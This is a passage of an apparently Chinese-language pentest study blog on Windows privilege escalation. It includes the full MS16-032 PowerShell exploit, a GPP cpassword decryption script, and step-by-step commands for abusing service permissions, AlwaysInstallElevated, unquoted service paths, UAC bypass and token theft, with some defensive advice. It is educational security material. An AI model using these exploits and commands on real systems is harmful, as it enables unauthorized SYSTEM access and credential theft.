. |___| | |_  |  _|</span></span><br><span class="line"><span class="string">    |_|_|_|___|_____|___|   |___|___|___|</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">                   [by b33f -&gt; @FuzzySec]</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ms16032</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Check logical processor count, race condition requires 2+</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`n[?] Operating system core count: <span class="variable">$</span>([System.Environment]::ProcessorCount)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$</span>([<span class="type">System.Environment</span>]::ProcessorCount) <span class="operator">-lt</span> <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[!] This is a VM isn&#x27;t it, race condition requires at least 2 CPU cores, exiting!`n&quot;</span></span><br><span class="line">        <span class="keyword">Return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Create array for Threads &amp; TID&#x27;s</span></span><br><span class="line">    <span class="variable">$ThreadArray</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    <span class="variable">$TidArray</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Duplicating CreateProcessWithLogonW handles..&quot;</span></span><br><span class="line">    <span class="comment"># Loop Get-ThreadHandle and collect thread handles with a valid TID</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">500</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$hThread</span> = <span class="built_in">Get-ThreadHandle</span></span><br><span class="line">        <span class="variable">$hThreadID</span> = [<span class="type">Kernel32</span>]::GetThreadId(<span class="variable">$hThread</span>)</span><br><span class="line">        <span class="comment"># Bit hacky/lazy, filters on uniq/valid TID&#x27;s to create $ThreadArray</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$TidArray</span> <span class="operator">-notcontains</span> <span class="variable">$hThreadID</span>) &#123;</span><br><span class="line">            <span class="variable">$TidArray</span> += <span class="variable">$hThreadID</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$hThread</span> <span class="operator">-ne</span> <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$ThreadArray</span> += <span class="variable">$hThread</span> <span class="comment"># This is what we need!</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$</span>(<span class="variable">$ThreadArray</span>.length) <span class="operator">-eq</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[!] No valid thread handles were captured, exiting!&quot;</span></span><br><span class="line">        <span class="keyword">Return</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[?] Done, got <span class="variable">$</span>(<span class="variable">$ThreadArray</span>.length) thread handle(s)!&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[?] Thread handle list:&quot;</span></span><br><span class="line">        <span class="variable">$ThreadArray</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;`n[*] Sniffing out privileged impersonation token..&quot;</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Thread</span> <span class="keyword">in</span> <span class="variable">$ThreadArray</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># Get handle to SYSTEM access token</span></span><br><span class="line">        <span class="built_in">Get-SystemToken</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[*] Sniffing out SYSTEM shell..&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;`n[&gt;] Duplicating SYSTEM token&quot;</span></span><br><span class="line">        <span class="variable">$hDuplicateTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::DuplicateToken(<span class="variable">$SysTokenHandle</span>, <span class="number">2</span>, [<span class="type">ref</span>]<span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Simple PS runspace definition</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Starting token race&quot;</span></span><br><span class="line">        <span class="variable">$Runspace</span> = [<span class="type">runspacefactory</span>]::CreateRunspace()</span><br><span class="line">        <span class="variable">$StartTokenRace</span> = [<span class="type">powershell</span>]::Create()</span><br><span class="line">        <span class="variable">$StartTokenRace</span>.runspace = <span class="variable">$Runspace</span></span><br><span class="line">        <span class="variable">$Runspace</span>.Open()</span><br><span class="line">        [<span class="built_in">void</span>]<span class="variable">$StartTokenRace</span>.AddScript(&#123;</span><br><span class="line">            <span class="keyword">Param</span> (<span class="variable">$Thread</span>, <span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</span><br><span class="line">                <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::SetThreadToken([<span class="type">ref</span>]<span class="variable">$Thread</span>, <span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).AddArgument(<span class="variable">$Thread</span>).AddArgument(<span class="variable">$hDuplicateTokenHandle</span>)</span><br><span class="line">        <span class="variable">$AscObj</span> = <span class="variable">$StartTokenRace</span>.BeginInvoke()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[&gt;] Starting process race&quot;</span></span><br><span class="line">        <span class="comment"># Adding a timeout (10 seconds) here to safeguard from edge-cases</span></span><br><span class="line">        <span class="variable">$SafeGuard</span> = [<span class="type">diagnostics.stopwatch</span>]::StartNew()</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$SafeGuard</span>.ElapsedMilliseconds <span class="operator">-lt</span> <span class="number">10000</span>) &#123;</span><br><span class="line">        <span class="comment"># StartupInfo Struct</span></span><br><span class="line">        <span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line">        <span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>) <span class="comment"># Struct Size</span></span><br><span class="line">        <span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000101 <span class="comment"># STARTF_USESTDHANDLES</span></span><br><span class="line">            <span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>;</span><br><span class="line">        <span class="comment"># ProcessInfo Struct</span></span><br><span class="line">        <span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span></span><br><span class="line">        <span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::CreateProcessWithLogonW(</span><br><span class="line">            <span class="string">&quot;user&quot;</span>, <span class="string">&quot;domain&quot;</span>, <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="number">0</span>x00000002, <span class="variable">$Application</span>,<span class="variable">$Commandline</span>,</span><br><span class="line">            <span class="number">0</span>x00000004, <span class="variable">$null</span>, <span class="variable">$GetCurrentPath</span>,</span><br><span class="line">            [<span class="type">ref</span>]<span class="variable">$StartupInfo</span>, [<span class="type">ref</span>]<span class="variable">$ProcessInfo</span>)</span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="comment"># Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.</span></span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="comment"># Missing this check used to cause the exploit to fail sometimes.</span></span><br><span class="line">        <span class="comment"># If CreateProcessWithLogon fails OpenProcessToken won&#x27;t succeed</span></span><br><span class="line">        <span class="comment"># but we obviously don&#x27;t have a SYSTEM shell :&#x27;( . Should be 100%</span></span><br><span class="line">        <span class="comment"># reliable now!</span></span><br><span class="line">        <span class="comment">#---</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;            </span><br><span class="line">        <span class="variable">$hTokenHandle</span> = [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Advapi32</span>]::OpenProcessToken(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">0</span>x28, [<span class="type">ref</span>]<span class="variable">$hTokenHandle</span>)</span><br><span class="line">        <span class="comment"># If we can&#x27;t open the process token it&#x27;s a SYSTEM shell!</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$CallResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[!] Holy handle leak Batman, we have a SYSTEM shell!!`n&quot;</span></span><br><span class="line">            <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::ResumeThread(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">            <span class="variable">$StartTokenRace</span>.Stop()</span><br><span class="line">            <span class="variable">$SafeGuard</span>.Stop()</span><br><span class="line">            <span class="keyword">Return</span></span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Clean up suspended process</span></span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::TerminateProcess(<span class="variable">$ProcessInfo</span>.hProcess, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hProcess)</span><br><span class="line">        <span class="variable">$CallResult</span> = [<span class="type">Kernel32</span>]::CloseHandle(<span class="variable">$ProcessInfo</span>.hThread)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Kill runspace &amp; stopwatch if edge-case</span></span><br><span class="line">        <span class="variable">$StartTokenRace</span>.Stop()</span><br><span class="line">        <span class="variable">$SafeGuard</span>.Stop()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="利用Metasploit发现缺少补丁"><a href="#利用Metasploit发现缺少补丁" class="headerlink" title="利用Metasploit发现缺少补丁"></a>利用Metasploit发现缺少补丁</h3><p>利用Metasploit中的 post/windows/gather/enum_patches 可以快速找出系统缺少补丁</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514152542.png"></p>
<h3 id="Windoes-Exploit-Suggster"><a href="#Windoes-Exploit-Suggster" class="headerlink" title="Windoes Exploit Suggster"></a>Windoes Exploit Suggster</h3><p>该工具可以将系统中已经安装的补丁与微软漏洞数据库比较快速。它需要当前系统的systeminfo信息。</p>
<p>该工具使用Python2</p>
<p>获得系统systeminfo 信息<br><code>systeminfo &gt; info.txt</code></p>
<p>执行命令，从微软官方下载数据库。数据库文件在当前目录下以Excel表格存放。<br><code>./windoes-exploit-suggester.py --update</code></p>
<p>执行如下命令安装xlrd模块<br><code>pip install xlrd -upgrade</code></p>
<p>使用工具进行判断，是否存在为修复的漏洞<br><code>windows-exploit-suggester.py -d 2019-02-02.xls -i patches.txt</code></p>
<p>同时Metaspolit内置了local-exploit-suggester模块。用于识别系统中可能被利用的漏洞<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514152708.png"></p>
<h3 id="PowerShell的Sherlock脚本"><a href="#PowerShell的Sherlock脚本" class="headerlink" title="PowerShell的Sherlock脚本"></a>PowerShell的Sherlock脚本</h3><p>利用SherLock脚本查找未安装的补丁</p>
<p>也可以搜索单个漏洞</p>
<h2 id="Windows系统配置错误利用提权"><a href="#Windows系统配置错误利用提权" class="headerlink" title="Windows系统配置错误利用提权"></a>Windows系统配置错误利用提权</h2><p>如果当前系统按时安装对应的补丁。如果没有0Day的情况下无法使用，常见的Exp提权。可以利用系统中的错误配置提权。</p>
<h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>Windows服务在操作系统启动的时候自动运行，并在后台调用可执行文件。如果一个低权限用户可以修改系统服务调用的可执行文件，将可执行文件改为恶意文件。当系统启动时，获得对应的系统权限。</p>
<p>Windows服务一般以System权限运行。它的文件夹，注册表收到访问控制包护。<br>系统服务权限配置错误有两种情况</p>
<ul>
<li>服务未运行：使用任意服务替换原本的服务，然后重启服务</li>
<li>服务正在运行且无法终止: 利用DLL劫持并尝试重启提权</li>
</ul>
<ol>
<li>PowerUp运用</li>
</ol>
<p>下载PowerUp。<br>使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerUp.pos1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Metasploit利用</li>
</ol>
<p>在Metasploit中对应的模块为 service_permission</p>
<p>该模块使用两种方法获得System权限。<br>如果meterpreter以管理员权限运行，该模块尝试创建一个新的服务。如果当前权限不允许创建服务，该模块会判断那些服务的文件或者文件夹权限有问题，并对其进行劫持。在创建服务或则劫持已经存在的服务是，该模块会创建一个可执行程序，期文件名和安装路径都是随机的。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514153401.png"></p>
<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated为一个策略选项。Windows运行低权限用户以System权限运行安装文件。如果启用该权限任何用户都可以用System权限安装恶意的MSI文件</p>
<ol>
<li>开始该漏洞</li>
</ol>
<p>该漏洞产生原因为开始了Windows Installer 特权安装功能 </p>
<p>在运行输入 <code>gpedit.msc</code>打开组策略编辑器</p>
<ul>
<li>计算机配置-管理模板-Windows组建-Windows Installer-永远以高特权进行安装：选择启用</li>
<li>用户配置-管理模板-Windows组建-Windows Installer-永远以高特权进行安装：选择启用</li>
</ul>
<p>设置完毕之后，会在注册表两个位置设置1</p>
<ul>
<li><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514155915.png"></li>
<li><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514155958.png"></li>
</ul>
<ol start="2">
<li><p>PowerUp使用</p>
</li>
<li><p>Import-Module .\PowerUp.ps1</p>
</li>
<li><p>Get-RegistryAlwaysInstallElevated // 判断是否启用<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514154756.png"></p>
</li>
<li><p>生成恶意MSI文件<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514154851.png"></p>
</li>
<li><p>运行MSI文件，添加用户<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514155132.png"><br>/quiet: 在安装过程中禁止向用户发送信息<br>/qn : 不使用GUI<br>/i 选择服务</p>
</li>
</ol>
<p>这里如果直接使用，系统会使用默认的帐号密码。可能因为密码不符合要求无法创建<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514155358.png"></p>
<p>也可以利用Metasploit 的 <code>windows/local/always_install_elevated</code>模块。<br>该模块会生成一个文件名随机MSI文件，并在提权后删除文件</p>
<p>禁用对应的注册表键AlwaysInstallElevated。就可以阻止提权</p>
<h3 id="可信服务路径漏洞"><a href="#可信服务路径漏洞" class="headerlink" title="可信服务路径漏洞"></a>可信服务路径漏洞</h3><p>可信服务路径: 包含空格且没有引号包括的路径。<br>该漏洞利用了Windows文件路径解析的特性。如果一个服务调用的可执行文件路径没有被双引号包含且路径中含有空格，那么这个服务有漏洞。<br>漏洞存在的两种可能:</p>
<ul>
<li>路径与服务有关，创建一个服务或者编译Service模板</li>
<li>如果路径与可执行文件有关，就任意创建一个可执行文件</li>
</ul>
<ol>
<li>漏洞产生原因</li>
</ol>
<p>Windows服务以System权限执行。系统在解析服务路径中的空格同样以系统权限进行。<br>如果一个文件路径<code>C:\Program Files\Some Folder\service.exe</code><br>对于路径中的每一个空格都会尝试寻找可以并执行与前面的名字相匹配的程序。在这个例子会依次匹配和执行如下程序</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program FIles\Some.exe</li>
<li>C:\Program FIles\Some Folder\Service.exe</li>
</ul>
<p>如果一个可执行文件按照对应格式上传到服务器对应的目录中。如果服务重启，程序以System权限运行。</p>
<ol start="2">
<li>手动利用利用</li>
</ol>
<p>使用wmic查询目标中可以利用的路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get name , displayname , pathname , startmode  | findstr /i &quot;Auto&quot;  | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514164003.png"></p>
<p>接着检查对应路径是否有写权限。使用Windows内置工具icacls。</p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514164434.png"></p>
<ul>
<li>(M): 修改</li>
<li>(F): 完全控制</li>
<li>(CI): 从属容器继承访问控制权</li>
<li>(OI): 从属文件将继承访问控制权限</li>
</ul>
<p>将可执行文件放在对应目录位置重启服务即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>

<p>也可以使用Metasploit 中的 <code>unquoted_service_path</code>模块</p>
<p>反弹后后有一个新的System权限的meterpreter。但是需要注意的是反弹的meterpreter会很快中断，因为当一个进程在Windows操作系统启动后，必须与服务控制管理器进行通信。如果没有通行，服务控制管理器会认为出现错误，进而终止该进程。需要在meterpreter断开前，将它迁移到其他进程中。可以使用命令<code>set AutoRunScript migrate -f</code></p>
<p>将文件路径使用引号包括就可以解决该问题</p>
<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在机器配置环境是通常会，使用脚本批量部署。在这个过程中会使用安装配置文件。这些文件这包含所有的安装配置信息，其中一些可能包含本地管理员管理帐号密码等。<br>文件列举如下:</p>
<p>Metasploit集成了利用模块<code>post/windows/gather/enum_unattend</code></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>使用命令查看计划任务<br><code>schtasks /query /fo LIST /v</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514202755.png"></p>
<p>可以使用AccessChk工具进行目录权限的配置情况。如果对以高权限运行的任务所在目录具有写权限，可以使用恶意程序覆盖原来的程序。</p>
<h3 id="Empire内置模块"><a href="#Empire内置模块" class="headerlink" title="Empire内置模块"></a>Empire内置模块</h3><p>Empire 内置了PowerUp部分模块。<code>privesc/powerup</code></p>
<p>其中Allchecks模块用于执行脚本，检查系统漏洞<br>AllChecks模块的应用对象如下:</p>
<ul>
<li>可行服务路径漏洞</li>
<li>ACL配置错误漏洞(“service_*”)</li>
<li>服务可执行文件权限配置不当(“service_exe_*”)</li>
<li>Unattend.xml文件</li>
<li>注册表AlwaysInstallElevated</li>
<li>注册表中的Autologon凭证</li>
<li>加密的web.conf字符串和应用程序密码</li>
<li>%PATH%.DLL的劫持机会(write_dllhijacker)</li>
</ul>
<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SYSVOL是活动目录中用于存放域公共文件服务器副本的共享文件夹，在所有DC之间复制。SYSVOL文件夹是在安装活动目录时自动创建的，用于存放登录脚本、组策略数据以及其他DC需要的域信息。SYSVOL在所有巾帼身份验证的域用户或则域信任用户具有读写权限的活动目录的域范围内共享。SYSVOL目录在整个DC中是自动同步和共享的，所有域策略放在C:\Windows\SYSVOL\DOMAIN\Policies\目录中。</p>
<p>在一般的域环境中，所有机器使用脚本批量部署。大多数要求加入域的计算机使用域用户密码进行登录验证。为了保持本地管理员密码安全，网络管理员往往修改本地管理员密码。</p>
<p>但是通过组策略修改的管理员密码在所有的域机器用户上都是相同的。获取了一台机器的本地管理员密码相当于获取所有域用户的管理员密码<br>常见的组策略首选项(GPP)如下:</p>
<ul>
<li>映射驱动器(Drives.xml)</li>
<li>创建本地用户</li>
<li>数据源(DataSources.xml)</li>
<li>打印机配置(Printers.xml)</li>
<li>创建/更新任务(Services.xml)</li>
<li>计划任务(ScheduledTasks.xml)</li>
</ul>
<h3 id="组策略首先项分析"><a href="#组策略首先项分析" class="headerlink" title="组策略首先项分析"></a>组策略首先项分析</h3><ol>
<li><p>创建组策略首选项，批量修改域中计算机本地管理员密码</p>
</li>
<li><p>获取组策略凭证<br>管理员在域中创建组策略后，系统在SYSVOL共享目录中生成XML文件，该文件保存了更新后的密码。该密码使用AES-256加密，但是微软公开了密钥。所以任何域用户可以访问共享目标，活动密码。</p>
</li>
</ol>
<p>(1) 手动查找cpassword<br>可以在文件中找到xml文件<code>\\dc\SYSVOL\hacke.testlab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups</code></p>
<p>可以发现加密密码为 <code>SD8KEunLpx1Yb1EG2xyf1Q</code><br>LdN1Ot2OiiJSC/e+nROCMw<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514212924.png"></p>
<p>在kali中使用Python脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Authored by: esec-pentest.sogeti.com  </span></span><br><span class="line"><span class="comment"># * http://esec-pentest.sogeti.com/post/Exploiting-Windows-2008-Group-Policy-Preferences  </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Updated by: Oleg Mitrofanov (reider-roque)</span></span><br><span class="line"><span class="comment"># * Made it work with newer versions of PyCrypto.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Works only with Python 2.</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cpassword</span>):</span> </span><br><span class="line">    <span class="comment"># Key from MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2</span></span><br><span class="line">    key = (<span class="string">&quot;4e9906e8fcb66cc9faf49310620ffee8&quot;</span> </span><br><span class="line">          <span class="string">&quot;f496e806cc057990209b09a433b66c1b&quot;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># Add padding to the base64 string and decode it</span></span><br><span class="line">    cpassword += <span class="string">&quot;=&quot;</span> * ((<span class="number">4</span> - <span class="built_in">len</span>(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">    password = b64decode(cpassword)</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># Decrypt the password</span></span><br><span class="line">    iv = <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">    o = AES.new(key, AES.MODE_CBC, iv).decrypt(password)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> o[:-<span class="built_in">ord</span>(o[-<span class="number">1</span>])].decode(<span class="string">&#x27;utf16&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python &#123;&#125; CPASSWORD&quot;</span>.<span class="built_in">format</span>(__file__))</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cpassword = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt(cpassword))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Fail! Make sure the supplied cpassword is correct.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220514215604.png"></p>
<p>(2)PowerSploit</p>
<p>开源框架PowerSploit提供了Get-GPPPassword.ps1脚本</p>
<p>(3) Metasploit<br>使用模块<code>post/windows/gather/credentials/gpp</code></p>
<p>(4)Empire</p>
<p>使用 <code>privesc/gpp</code>模块</p>
<p>除了Groups.xml还有几个组策略首选项文件有可选的cpassword属性</p>
<ul>
<li>Services\Services.xml</li>
<li>ScheduledTasks\ScheduledTasks.xml</li>
<li>Printer\Printers.xml</li>
<li>Driver\Driver.xml</li>
<li>DataSources\DataSources.xml</li>
</ul>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>在用于组策略管理的计算机上安装KB2962486补丁.不降密码保存在组策略首选项中.</p>
<ul>
<li>设置共享文件夹SYSVOL的访问权限</li>
<li>将含有组策略密码XML文件从SYSVOL目录中删除</li>
<li>如果需要更改计算机将中本地管理员密码, 建议使用LAPS</li>
</ul>
<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><p>UAC要求拥有权限不够的的用户进行可能影响其他用户的操作的时候需要对用户身份进行验证。<br>需要UAC授权才能进行操作如下:</p>
<ul>
<li>配置Windows Update</li>
<li>增加/删除帐号</li>
<li>更改帐号类型</li>
<li>更改UAC</li>
<li>安装ActiveX</li>
<li>安装/卸载程序</li>
<li>安装设置驱动程序</li>
<li>将文件移动/复制到 Program Files或 Windows目录下</li>
<li>查看其他用户的文件夹</li>
</ul>
<p>UAC有4中种设置</p>
<ul>
<li>始终通知: 每当有程序需要使用高级别的权限是提示本地用户</li>
<li>仅在程序试图更改计算机时通知我: 当本地Windows程序要使用高级别程序，不会通知用户。但是当第三方程序需要使用高级别权限是，提示本地用户</li>
<li>仅在程序试图更改计算机时通知我(不降低桌面亮度):与上一条相同，但是在提示时不降低桌面亮度</li>
<li>从不提示: 当用户为管理员时，所有程序以最高权限运行</li>
</ul>
<h3 id="Bypassuac模块"><a href="#Bypassuac模块" class="headerlink" title="Bypassuac模块"></a>Bypassuac模块</h3><p>msf中存在<code>exploit/windows/local/bypassuac</code>模块</p>
<p>当当前用户在管理员组中且UAC设置为默认设置(仅当程序视图更改计算机时提醒我)可以将用户提权为System</p>
<h3 id="Runas模块"><a href="#Runas模块" class="headerlink" title="Runas模块"></a>Runas模块</h3><p>msf存在<code>windows/local/ask</code>模块</p>
<p>使用命令后，目标机器上弹出UAC对话框。单击是返回新的Shell。这时Shell已经是System权限。如果不是使用<code>getsystem</code>命令后实现提权。</p>
<p>要使用Runas模块，用户必须在管理员组或者知道管理员密码</p>
<h3 id="Nishang-Invoke-PsUACme模块"><a href="#Nishang-Invoke-PsUACme模块" class="headerlink" title="Nishang Invoke-PsUACme模块"></a>Nishang Invoke-PsUACme模块</h3><h3 id="Empire的bypassuac模块"><a href="#Empire的bypassuac模块" class="headerlink" title="Empire的bypassuac模块"></a>Empire的bypassuac模块</h3><h3 id="bypassuac-wscipt模块"><a href="#bypassuac-wscipt模块" class="headerlink" title="bypassuac_wscipt模块"></a>bypassuac_wscipt模块</h3><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>不让内网机器拥有本地管理员权限</p>
<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>令牌(Token)值系统中的临时密钥。用来决定当前请求属于那个用户。获得了令牌，可以不提供帐号密码的情况下访问网络和系统资源。</p>
<p>令牌窃取的核心是Kerberos协议。<br>Kerberos协议工作流程:</p>
<ol>
<li>客户端向认证服务器发送请求，要求获得证书</li>
<li>认证服务器接收请求后，将加密证书发送给客户端。该证书包含服务器Ticket（包含服务器密钥加密后的客户机身份和一个会话密钥）和一个临时加密密钥(SessionKey)。同时认证服务器也会向服务器发送证书，让服务器可以验证客户端身份。</li>
<li>客户端将Ticket发送给服务器。如果服务器确认客户端身份，允许它登录服务器。</li>
</ol>
<p>客户端登录服务器后，攻击者可以通过入侵服务器获得客户端令牌。</p>
<h3 id="令牌窃取-1"><a href="#令牌窃取-1" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>如果在msf中获得了meterpreter Shell。<br>使用<code>use incognito</code>输入 <code>list_tolens -u</code>列出可用令牌<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517113737.png"></p>
<p>有两种类型的令牌</p>
<ul>
